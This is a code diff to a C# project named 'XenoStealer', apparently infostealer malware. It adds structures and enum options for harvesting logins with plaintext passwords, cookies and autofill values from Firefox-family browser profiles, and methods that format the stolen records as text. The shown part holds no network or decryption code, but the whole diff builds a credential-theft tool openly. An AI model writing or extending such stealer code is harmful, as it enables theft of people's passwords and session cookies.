@@ -8,11 +8,122 @@ namespace XenoStealer
 {
     public static class DataExtractionStructs
     {
+
+        [Flags]
+        public enum GeckoBrowserOptions 
+        {
+            None = 0,
+            Logins = 1 << 0, // 1
+            Cookies = 1 << 1, // 2
+            Autofills = 1 << 2, // 4
+            All = Logins | Cookies | Autofills
+        }
+
+        public struct GeckoBrowser 
+        {
+            public string browserName;
+
+            public GeckoProfile[] profiles;
+
+            public GeckoBrowser(GeckoProfile[] _profiles, string _browserName) 
+            {
+                browserName = _browserName;
+                if (_profiles == null)
+                {
+                    profiles = new GeckoProfile[0];
+                }
+                else 
+                {
+                    profiles = _profiles;
+                }
+            }
+
+        }
+
+        public struct GeckoProfile 
+        {
+            public string profileName;
+
+            public GeckoLogin[] logins;
+            public GeckoCookie[] cookies;
+            public GeckoAutoFill[] autofills;
+
+            public GeckoProfile(GeckoLogin[] _logins, GeckoCookie[] _cookies, GeckoAutoFill[] _autofills, string _profileName) 
+            {
+                profileName= _profileName;
+                if (_logins == null)
+                {
+                    logins = new GeckoLogin[0];
+                }
+                else
+                {
+                    logins = _logins;
+                }
+
+                if (_cookies == null)
+                {
+                    cookies = new GeckoCookie[0];
+                }
+                else
+                {
+                    cookies = _cookies;
+                }
+
+                if (_autofills == null)
+                {
+                    autofills = new GeckoAutoFill[0];
+                }
+                else
+                {
+                    autofills = _autofills;
+                }
+
+            }
+
+            public string GetLoginsString()
+            {
+                string result = "";
+                foreach (GeckoLogin i in logins)
+                {
+                    result += i.ToString();
+                    result += Environment.NewLine;
+                    result += Environment.NewLine;
+                }
+                return result;
+            }
+
+            public string GetCookiesString()
+            {
+                string result = "";
+                foreach (GeckoCookie i in cookies)
+                {
+                    result += i.ToString();
+                    result += Environment.NewLine;
+                    result += Environment.NewLine;
+                }
+                return result;
+            }
+
+            public string GetAutofillsString()
+            {
+                string result = "";
+                foreach (GeckoAutoFill i in autofills)
+                {
+                    result += i.ToString();
+                    result += Environment.NewLine;
+                    result += Environment.NewLine;
+                }
+                return result;
+            }
+
+        }
+
         public struct GeckoLogin 
         {
             public string hostname;
             public string username;
             public string password;
+
 
             public GeckoLogin(string _hostname, string _username, string _password) 
             {
@@ -75,8 +186,26 @@ namespace XenoStealer
                 result += "EXPIRED: " + expired.ToString();
                 return result;
             }
+        }
 
+        public struct GeckoAutoFill 
+        {
+            public string name;
+            public string value;
 
+            public GeckoAutoFill(string _name, string _value) 
+            { 
+                name = _name;
+                value = _value;
+            }
+
+            public override string ToString() 
+            {
+                string result = "NAME: " + name;
+                result+= Environment.NewLine;
+                result += "VALUE: " + value;
+                return result;
+            }
         }
 
 
